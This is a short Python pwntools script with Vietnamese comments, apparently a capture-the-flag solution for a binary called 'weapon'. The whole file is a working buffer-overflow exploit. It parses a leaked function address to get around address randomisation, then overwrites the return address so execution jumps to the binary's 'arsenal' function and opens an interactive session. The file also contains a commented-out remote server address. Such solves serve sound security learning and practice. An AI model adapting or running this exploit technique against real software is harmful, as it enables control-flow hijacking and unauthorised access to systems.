from pwn import *

binary = context.binary = ELF('./weapon')

p = process('./weapon')
#p = remote('61.28.237.24','30201')

p.recvuntil('Your current location is townsquare with the address ')

# lấy địa chỉ của hàm townsquare
add_curr = p.recvline().strip()

# chuyển string sang int
add = int(add_curr, 16)


# padding từ biến nhập vào đến địa chỉ trả về
payload = b'A'*(0x18+0x4)

# tính offset khoảng cách địa chỉ local và địa chỉ trên server từ địa chỉ townsquare vừa nhận được
offset = add - binary.sym.townsquare


# nối vào payload địa chỉ mới của hàm arsenal từ offset vừa tính
payload += p32(binary.sym.arsenal+offset)

p.sendline(payload)

p.interactive()
